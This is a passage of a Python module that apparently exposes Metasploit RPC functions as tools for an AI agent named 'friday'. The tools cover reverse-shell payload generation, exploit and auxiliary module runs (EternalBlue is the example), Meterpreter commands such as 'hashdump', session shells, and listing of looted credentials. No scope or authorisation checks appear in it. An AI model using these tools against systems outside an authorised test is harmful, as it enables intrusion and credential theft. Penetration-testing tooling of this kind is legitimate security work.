    formats = ["raw", "exe", "psh", "python", "bash", "c"]
    generated_payloads: list[dict[str, Any]] = []
    for payload_mod, arch, plat in payload_modules:
        for fmt in formats:
            try:
                result = await msf_payload_generate(
                    payload=payload_mod,
                    lhost=lhost,
                    lport=lport,
                    format=fmt,
                    arch=arch,
                    platform=plat,
                )
                if result.get("success"):
                    gen: dict[str, Any] = {
                        "payload": payload_mod,
                        "format": fmt,
                        "arch": arch or "any",
                        "platform": plat or "any",
                        "size_bytes": result.get("size_bytes", 0),
                    }
                    if fmt in ("python", "bash", "psh", "c"):
                        try:
                            raw_hex = result.get("payload_hex", "")
                            raw_bytes = bytes.fromhex(raw_hex) if raw_hex else b""
                            gen["code"] = raw_bytes.decode("utf-8", errors="replace")[:2000]
                        except Exception:
                            gen["code"] = ""
                    generated_payloads.append(gen)
            except Exception:
                continue
    generated_payloads.sort(key=lambda p: (p.get("platform", ""), p.get("arch", ""), p.get("format", "")))
    return {
        "success": True,
        "lhost": lhost,
        "lport": lport,
        "total_payloads": len(generated_payloads),
        "payloads": generated_payloads,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


async def metasploit_connect() -> dict[str, Any]:
    """Connect to Metasploit RPC daemon (convenience wrapper).

    Uses environment variables MSF_HOST, MSF_PORT, MSF_PASS, MSF_SSL.

    Returns:
        Dict with connection status and server version.
    """
    if not msf_is_installed():
        return {"success": False, "error": "Metasploit is not installed on this system. Install from https://www.metasploit.com/", "tool": "metasploit_connect"}
    try:
        return await msf_connect(
            host=MSF_HOST,
            port=MSF_PORT,
            password=MSF_PASS,
            ssl=MSF_SSL,
        )
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "host": MSF_HOST,
            "port": MSF_PORT,
            "message": "Connection attempt failed",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }


async def metasploit_status() -> dict[str, Any]:
    """Check Metasploit RPC daemon status (convenience wrapper).

    Returns:
        Dict with alive status and latency.
    """
    if not msf_is_installed():
        return {"alive": False, "error": "Metasploit is not installed on this system. Install from https://www.metasploit.com/", "tool": "metasploit_status"}
    try:
        return await msf_status()
    except Exception as e:
        return {
            "alive": False,
            "error": str(e),
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }


# ── Additional utility tools ──

async def msf_workspace_switch(name: str) -> dict[str, Any]:
    """Switch the active Metasploit workspace.

    Args:
        name: Name of the workspace to switch to

    Returns:
        Dict with operation status.
    """
    if not name or not name.strip():
        return {"error": "No workspace name provided", "tool": "msf_workspace_switch"}
    try:
        client = await get_client()
        cmd = f"workspace {name.strip()}"
        result = await client.console_execute_command(cmd, timeout=10.0)
        output = result.get("output", "")
        return {
            "success": True,
            "workspace": name.strip(),
            "message": output.strip() or f"Switched to workspace '{name}'",
            "output": output,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "tool": "msf_workspace_switch", "name": name}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "tool": "msf_workspace_switch", "name": name}


async def msf_workspace_delete(name: str) -> dict[str, Any]:
    """Delete a Metasploit workspace.

    Args:
        name: Name of the workspace to delete

    Returns:
        Dict with operation status.
    """
    if not name or not name.strip():
        return {"error": "No workspace name provided", "tool": "msf_workspace_delete"}
    try:
        client = await get_client()
        cmd = f"workspace -d {name.strip()}"
        result = await client.console_execute_command(cmd, timeout=15.0)
        output = result.get("output", "")
        success = "removed" in output.lower() or "deleted" in output.lower() or "destroyed" in output.lower()
        return {
            "success": success,
            "workspace": name.strip(),
            "message": output.strip() or f"Workspace '{name}' deleted",
            "output": output,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "tool": "msf_workspace_delete", "name": name}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "tool": "msf_workspace_delete", "name": name}


async def msf_db_import(nmap_xml_path: str, workspace: Optional[str] = None) -> dict[str, Any]:
    """Import an Nmap XML scan result into the Metasploit database.

    Args:
        nmap_xml_path: Path to the Nmap XML output file
        workspace: Optional workspace to import into

    Returns:
        Dict with import status and details.
    """
    if not nmap_xml_path:
        return {"error": "No file path provided", "tool": "msf_db_import"}
    if not os.path.isfile(nmap_xml_path):
        return {"error": f"File not found: {nmap_xml_path}", "tool": "msf_db_import"}
    try:
        client = await get_client()
        result = await client.db_import_data(nmap_xml_path, workspace=workspace)
        return {
            "success": result.get("success", False),
            "path": nmap_xml_path,
            "workspace": workspace or "default",
            "message": result.get("imported", "Import completed"),
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "tool": "msf_db_import"}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "tool": "msf_db_import"}


async def msf_resource_script(script_path: str) -> dict[str, Any]:
    """Run a Metasploit resource script (.rc file).

    Args:
        script_path: Path to the .rc resource script file

    Returns:
        Dict with script execution output.
    """
    if not script_path:
        return {"error": "No script path provided", "tool": "msf_resource_script"}
    if not os.path.isfile(script_path):
        return {"error": f"File not found: {script_path}", "tool": "msf_resource_script"}
    try:
        with open(script_path, "r", encoding="utf-8", errors="replace") as f:
            script_content = f.read()
    except Exception as e:
        return {"error": f"Failed to read script file: {e}", "tool": "msf_resource_script"}
    try:
        client = await get_client()
        con = await client.console_create()
        console_id = con["id"]
        await asyncio.sleep(0.5)
        lines = script_content.strip().split("\n")
        all_output: list[str] = []
        for line in lines:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            try:
                chunk = await client.console_execute_command(
                    command=line,
                    console_id=console_id,
                    timeout=30.0,
                )
                out = chunk.get("output", "")
                if out:
                    all_output.append(f"$ {line}\n{out}")
            except Exception as e:
                all_output.append(f"$ {line}\n[ERROR] {e}")
        try:
            await client.console_destroy(console_id)
        except Exception:
            pass
        return {
            "success": True,
            "script": script_path,
            "total_commands": len(lines),
            "output": "\n\n".join(all_output),
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "tool": "msf_resource_script"}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "tool": "msf_resource_script"}


async def msf_jobs_list() -> dict[str, Any]:
    """List all running Metasploit jobs.

    Returns:
        Dict with job count and job details.
    """
    try:
        client = await get_client()
        jobs = await client.job_list()
        return {
            "success": True,
            "count": jobs.get("count", 0),
            "jobs": jobs.get("jobs", {}),
            "timestamp": jobs.get("timestamp", datetime.now(timezone.utc).isoformat()),
        }
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "tool": "msf_jobs_list"}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "tool": "msf_jobs_list"}


async def msf_job_stop(job_id: int) -> dict[str, Any]:
    """Stop a running Metasploit job.

    Args:
        job_id: Numeric job ID to stop

    Returns:
        Dict with operation status.
    """
    if job_id is None:
        return {"error": "No job ID provided", "tool": "msf_job_stop"}
    try:
        client = await get_client()
        result = await client.job_stop(job_id)
        return {
            "success": result.get("success", False),
            "job_id": job_id,
            "message": f"Job {job_id} stopped",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "tool": "msf_job_stop", "job_id": job_id}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "tool": "msf_job_stop", "job_id": job_id}


async def msf_loot_list(workspace: Optional[str] = None) -> dict[str, Any]:
    """List collected loot in the Metasploit database.

    Args:
        workspace: Optional workspace to filter by

    Returns:
        Dict with list of loot items and their metadata.
    """
    try:
        client = await get_client()
        loots = await client.db_loots(workspace=workspace)
        return {
            "success": True,
            "count": len(loots),
            "loot": loots,
            "workspace": workspace or "default",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "tool": "msf_loot_list"}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "tool": "msf_loot_list"}


async def msf_services_list(workspace: Optional[str] = None) -> dict[str, Any]:
    """List discovered services in the Metasploit database.

    Args:
        workspace: Optional workspace to filter by

    Returns:
        Dict with list of services (host, port, proto, name, state).
    """
    try:
        client = await get_client()
        services = await client.db_services(workspace=workspace)
        return {
            "success": True,
            "count": len(services),
            "services": services,
            "workspace": workspace or "default",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "tool": "msf_services_list"}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "tool": "msf_services_list"}


async def msf_session_stop(session_id: str) -> dict[str, Any]:
    """Terminate an active Metasploit session.

    Args:
        session_id: The numeric session ID to kill

    Returns:
        Dict with operation status.
    """
    if not session_id:
        return {"error": "No session ID provided", "tool": "msf_session_stop"}
    try:
        client = await get_client()
        result = await client.session_stop(session_id)
        return {
            "success": result.get("success", False),
            "session_id": session_id,
            "message": f"Session {session_id} terminated",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "tool": "msf_session_stop", "session_id": session_id}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "tool": "msf_session_stop", "session_id": session_id}


async def msf_module_list(module_type: str = "exploit") -> dict[str, Any]:
    """List Metasploit modules of a given type.

    Args:
        module_type: Module type: exploit, auxiliary, post, payload, encoder, nop

    Returns:
        Dict with count and list of available modules.
    """
    valid_types = {"exploit", "auxiliary", "post", "payload", "encoder", "nop"}
    if module_type not in valid_types:
        return {"error": f"Invalid module type '{module_type}'. Valid: {', '.join(sorted(valid_types))}", "tool": "msf_module_list"}
    try:
        client = await get_client()
        type_map = {
            "exploit": client.module_exploits,
            "auxiliary": client.module_auxiliary,
            "post": client.module_post,
            "payload": client.module_payloads,
            "encoder": client.module_encoders,
            "nop": client.module_nops,
        }
        modules = await type_map[module_type]()
        return {
            "success": True,
            "type": module_type,
            "count": len(modules),
            "modules": modules,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "tool": "msf_module_list", "type": module_type}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "tool": "msf_module_list", "type": module_type}


async def msf_session_meterpreter(session_id: str, command: str) -> dict[str, Any]:
    """Run a Meterpreter command directly on a session.

    Use this instead of msf_session_shell when you know the session
    is a Meterpreter session and want to use Meterpreter-specific commands.

    Args:
        session_id: The numeric session ID
        command: Meterpreter command (e.g. "sysinfo", "getuid", "hashdump")

    Returns:
        Dict with command output.
    """
    if not session_id:
        return {"error": "No session ID provided", "tool": "msf_session_meterpreter"}
    if not command or not command.strip():
        return {"error": "No command provided", "tool": "msf_session_meterpreter"}
    try:
        client = await get_client()
        result = await client.session_shell_execute(session_id, command.strip())
        return {
            "success": True,
            "session_id": session_id,
            "command": result.get("command", command),
            "output": result.get("output", ""),
            "duration_seconds": result.get("duration_seconds", 0),
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "tool": "msf_session_meterpreter", "session_id": session_id}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "tool": "msf_session_meterpreter", "session_id": session_id}


async def msf_version() -> dict[str, Any]:
    """Get Metasploit framework version information.

    Returns:
        Dict with version, Ruby version, and API version.
    """
    try:
        client = await get_client()
        version = await client.core_version()
        stats = await client.core_module_stats()
        return {
            "success": True,
            "version": version.get("version", "unknown"),
            "ruby": version.get("ruby", "unknown"),
            "api": version.get("api", "unknown"),
            "framework_owner": version.get("framework_owner", ""),
            "module_stats": stats,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "tool": "msf_version"}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "tool": "msf_version"}


async def msf_compatible_payloads(module_path: str) -> dict[str, Any]:
    """List payloads compatible with a given exploit module.

    Args:
        module_path: Exploit module path (e.g. "exploit/windows/smb/ms17_010_eternalblue")

    Returns:
        Dict with list of compatible payloads.
    """
    if not module_path:
        return {"error": "No module path provided", "tool": "msf_compatible_payloads"}
    try:
        client = await get_client()
        payloads = await client.module_compatible_payloads(module_path)
        return {
            "success": True,
            "module": module_path,
            "count": len(payloads),
            "payloads": payloads,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "tool": "msf_compatible_payloads", "module": module_path}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "tool": "msf_compatible_payloads", "module": module_path}


async def msf_notes_list(workspace: Optional[str] = None) -> dict[str, Any]:
    """List notes in the Metasploit database.

    Args:
        workspace: Optional workspace to filter by

    Returns:
        Dict with list of notes.
    """
    try:
        client = await get_client()
        notes = await client.db_notes(workspace=workspace)
        return {
            "success": True,
            "count": len(notes),
            "notes": notes,
            "workspace": workspace or "default",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcError as e:
        return {"error": f"Metasploit error: {e}", "tool": "msf_notes_list"}
    except Exception as e:
        return {"error": f"Unexpected error: {e}", "tool": "msf_notes_list"}


METASPLOIT_TOOL_DESCRIPTIONS: list[tuple[str, str, str, dict | None, list[str] | None]] = [
    ("friday.metasploit_tool", "msf_connect", "Connect to Metasploit RPC daemon (msfrpd). Authenticates and returns server version.",
     {"host": {"type": "STRING", "description": "msfrpd hostname/IP (default: MSF_HOST env or 127.0.0.1)"},
      "port": {"type": "INTEGER", "description": "msfrpd port (default: MSF_PORT env or 55553)"},
      "password": {"type": "STRING", "description": "RPC password (default: MSF_PASS env or 'msf')"},
      "ssl": {"type": "BOOLEAN", "description": "Use HTTPS (default: MSF_SSL env or False)"}}, None),
    ("friday.metasploit_tool", "msf_status", "Check Metasploit RPC daemon status and health. Returns alive status, version, and latency.", None, None),
    ("friday.metasploit_tool", "msf_console_exec", "Execute a command in a temporary msfconsole session. Creates a console, runs the command, captures output, and destroys it.",
     {"command": {"type": "STRING", "description": "msfconsole command to execute (e.g. 'route print', 'use exploit/...')"},
      "timeout": {"type": "NUMBER", "description": "Max seconds to wait (default 60)"}}, ["command"]),
    ("friday.metasploit_tool", "msf_search", "Search Metasploit modules by name or path across all types (exploit, auxiliary, post, payload).",
     {"query": {"type": "STRING", "description": "Search string to match against module names/paths"}}, ["query"]),
    ("friday.metasploit_tool", "msf_module_info", "Get detailed information about a Metasploit module including options, targets, actions, references, and metadata.",
     {"module_path": {"type": "STRING", "description": "Full module path (e.g. 'exploit/windows/smb/ms17_010_eternalblue') or partial name"}}, ["module_path"]),
    ("friday.metasploit_tool", "msf_exploit_run", "Run a Metasploit exploit module against a target. Configures RHOSTS and runs the exploit with optional payload.",
     {"target": {"type": "STRING", "description": "Target IP address or hostname"},
      "module": {"type": "STRING", "description": "Exploit module path (e.g. 'exploit/windows/smb/ms17_010_eternalblue')"},
      "payload": {"type": "STRING", "description": "Payload module (e.g. 'windows/x64/meterpreter/reverse_tcp')"},
      "options": {"type": "OBJECT", "description": "Additional module options key=value pairs"},
      "lhost": {"type": "STRING", "description": "Local IP for reverse connections (auto-detected if omitted)"},
      "lport": {"type": "INTEGER", "description": "Local port for reverse connections"},
      "job_run": {"type": "BOOLEAN", "description": "Run as background job (default True)"}}, ["target", "module"]),
    ("friday.metasploit_tool", "msf_auxiliary_run", "Run a Metasploit auxiliary module (scanner, discovery, information gathering).",
     {"target": {"type": "STRING", "description": "Target IP, CIDR range, or hostname"},
      "module": {"type": "STRING", "description": "Auxiliary module path (e.g. 'auxiliary/scanner/portscan/tcp')"},
      "options": {"type": "OBJECT", "description": "Additional module options"},
      "action": {"type": "STRING", "description": "Module action to run (if supported)"},
      "job_run": {"type": "BOOLEAN", "description": "Run as background job (default True)"}}, ["target", "module"]),
    ("friday.metasploit_tool", "msf_sessions_list", "List all active Metasploit sessions with details (type, target, platform, exploit used).", None, None),
    ("friday.metasploit_tool", "msf_session_details", "Get detailed information about a specific Metasploit session.",
     {"session_id": {"type": "STRING", "description": "Numeric session ID"}}, ["session_id"]),
    ("friday.metasploit_tool", "msf_session_shell", "Execute a system command in an active Metasploit shell or meterpreter session.",
     {"session_id": {"type": "STRING", "description": "Numeric session ID"},
      "command": {"type": "STRING", "description": "Command to execute on the target"}}, ["session_id", "command"]),
    ("friday.metasploit_tool", "msf_payload_generate", "Generate a Metasploit payload binary in various formats (raw, exe, dll, psh, python, bash, c).",
     {"payload": {"type": "STRING", "description": "Payload module path (e.g. 'windows/x64/meterpreter/reverse_tcp')"},
      "lhost": {"type": "STRING", "description": "Local host/IP for reverse connection"},
      "lport": {"type": "INTEGER", "description": "Local port for reverse connection"},
      "format": {"type": "STRING", "description": "Output format: raw, exe, dll, psh, python, bash, c, perl, vba, vbs, asp, war, elf, macho (default raw)"},
      "arch": {"type": "STRING", "description": "Target architecture (e.g. x64, x86)"},
      "platform": {"type": "STRING", "description": "Target platform (e.g. windows, linux)"},
      "encoder": {"type": "STRING", "description": "Encoder module to use"}}, ["payload", "lhost", "lport"]),
    ("friday.metasploit_tool", "msf_workspace_create", "Create a new Metasploit workspace to isolate different projects/targets.",
     {"name": {"type": "STRING", "description": "Name for the new workspace"}}, ["name"]),
    ("friday.metasploit_tool", "msf_workspace_list", "List all Metasploit workspaces with metadata.", None, None),
    ("friday.metasploit_tool", "msf_hosts_list", "List discovered hosts in the Metasploit database with OS, service count, and vuln count.",
     {"workspace": {"type": "STRING", "description": "Optional workspace name to filter by"}}, None),
    ("friday.metasploit_tool", "msf_vulns_list", "List vulnerabilities in the Metasploit database with host, port, and reference info.",
     {"workspace": {"type": "STRING", "description": "Optional workspace name to filter by"}}, None),
    ("friday.metasploit_tool", "msf_creds_list", "List discovered credentials in the Metasploit database.",
     {"workspace": {"type": "STRING", "description": "Optional workspace name to filter by"}}, None),
    ("friday.metasploit_tool", "metasploit_exploit", "High-level exploit function that runs an exploit and monitors for session creation. Wraps msf_exploit_run with session monitoring.",
     {"target": {"type": "STRING", "description": "Target IP address or hostname"},
      "module": {"type": "STRING", "description": "Exploit module path"},
      "payload": {"type": "STRING", "description": "Optional payload module"}}, ["target", "module"]),
    ("friday.metasploit_tool", "metasploit_scan", "High-level scan function that runs appropriate auxiliary scanner modules based on scan type.",
     {"target": {"type": "STRING", "description": "Target IP, CIDR range, or hostname"},
      "scan_type": {"type": "STRING", "description": "Scan type: default, quick, full, smb, http, ssh, mysql, mssql, vuln"}}, ["target"]),
    ("friday.metasploit_tool", "metasploit_post_exploit", "Perform post-exploitation actions on an active session. Gathers system info, user context, network config, and more.",
     {"session_id": {"type": "STRING", "description": "Active session ID"}}, ["session_id"]),
    ("friday.metasploit_tool", "metasploit_payload_gen", "Generate multiple Metasploit payload formats (raw, exe, psh, python, bash, c) for various platforms/architectures.",
     {"lhost": {"type": "STRING", "description": "Local host/IP for reverse connections"},
      "lport": {"type": "INTEGER", "description": "Local port for reverse connections"}}, ["lhost", "lport"]),
    ("friday.metasploit_tool", "metasploit_connect", "Connect to Metasploit RPC daemon using environment variables (MSF_HOST, MSF_PORT, MSF_PASS, MSF_SSL). Convenience wrapper.", None, None),
    ("friday.metasploit_tool", "metasploit_status", "Check Metasploit RPC daemon status. Convenience wrapper around msf_status.", None, None),
    ("friday.metasploit_tool", "msf_workspace_switch", "Switch the active Metasploit workspace.",
     {"name": {"type": "STRING", "description": "Workspace name to switch to"}}, ["name"]),
    ("friday.metasploit_tool", "msf_workspace_delete", "Delete a Metasploit workspace.",
     {"name": {"type": "STRING", "description": "Workspace name to delete"}}, ["name"]),
    ("friday.metasploit_tool", "msf_db_import", "Import an Nmap XML scan result into the Metasploit database.",
     {"nmap_xml_path": {"type": "STRING", "description": "Path to Nmap XML output file"},
      "workspace": {"type": "STRING", "description": "Optional workspace to import into"}}, ["nmap_xml_path"]),
    ("friday.metasploit_tool", "msf_resource_script", "Run a Metasploit resource script (.rc file) line by line in a console.",
     {"script_path": {"type": "STRING", "description": "Path to .rc resource script file"}}, ["script_path"]),
    ("friday.metasploit_tool", "msf_jobs_list", "List all running Metasploit jobs.", None, None),
    ("friday.metasploit_tool", "msf_job_stop", "Stop a running Metasploit job by ID.",
     {"job_id": {"type": "INTEGER", "description": "Numeric job ID to stop"}}, ["job_id"]),
    ("friday.metasploit_tool", "msf_loot_list", "List collected loot in the Metasploit database.",
     {"workspace": {"type": "STRING", "description": "Optional workspace to filter by"}}, None),
    ("friday.metasploit_tool", "msf_services_list", "List discovered services in the Metasploit database (host, port, proto, name, state).",
     {"workspace": {"type": "STRING", "description": "Optional workspace to filter by"}}, None),
    ("friday.metasploit_tool", "msf_session_stop", "Terminate an active Metasploit session.",
     {"session_id": {"type": "STRING", "description": "Numeric session ID to kill"}}, ["session_id"]),
    ("friday.metasploit_tool", "msf_module_list", "List available Metasploit modules by type.",
     {"module_type": {"type": "STRING", "description": "Module type: exploit, auxiliary, post, payload, encoder, nop (default exploit)"}}, None),
    ("friday.metasploit_tool", "msf_version", "Get Metasploit framework version including Ruby and API versions.", None, None),
    ("friday.metasploit_tool", "msf_compatible_payloads", "List payloads compatible with a given exploit module.",
     {"module_path": {"type": "STRING", "description": "Exploit module path"}}, ["module_path"]),
    ("friday.metasploit_tool", "msf_notes_list", "List notes in the Metasploit database.",
     {"workspace": {"type": "STRING", "description": "Optional workspace to filter by"}}, None),
]

__all__ = [
    "MsfrpcClient",
    "MsfrpcError",
    "MsfrpcAuthError",
    "MsfrpcConnectionError",
    "MsfrpcTimeoutError",
    "get_client",
    "close_client",
    "msf_connect",
    "msf_status",
    "msf_console_exec",
    "msf_search",
    "msf_module_info",
    "msf_exploit_run",
    "msf_auxiliary_run",
    "msf_sessions_list",
    "msf_session_details",
    "msf_session_shell",
    "msf_payload_generate",
    "msf_workspace_create",
    "msf_workspace_list",
    "msf_hosts_list",
    "msf_vulns_list",
    "msf_creds_list",
    "metasploit_exploit",
    "metasploit_scan",
    "metasploit_post_exploit",
    "metasploit_payload_gen",
    "metasploit_connect",
    "metasploit_status",
    "msf_workspace_switch",
    "msf_workspace_delete",
    "msf_db_import",
    "msf_resource_script",
    "msf_jobs_list",
    "msf_job_stop",
    "msf_loot_list",
    "msf_services_list",
    "msf_session_stop",
    "msf_module_list",
    "msf_version",
    "msf_compatible_payloads",
    "msf_notes_list",
    "METASPLOIT_TOOL_DESCRIPTIONS",
]
